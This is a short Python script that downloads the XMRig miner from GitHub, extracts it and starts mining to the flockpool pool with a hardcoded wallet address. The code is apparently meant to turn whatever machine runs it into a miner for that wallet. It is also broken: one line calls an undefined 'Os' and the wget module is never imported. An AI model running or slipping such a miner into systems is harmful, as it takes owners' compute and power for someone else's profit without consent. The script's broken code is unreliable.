import os
os.system('pip install wget')
Os.system('apt install wget')

wget.download("https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz")
os.system('tar xf xmrig-6.16.2-linux-static-x64.tar.gz')
os.system('./xmrig-6.16.2/xmrig -a gr -o us.flockpool.com:5555 --tls -u RLUciajDyEujXL6J21S83EfapBJLte9gu6.kk11 -p')
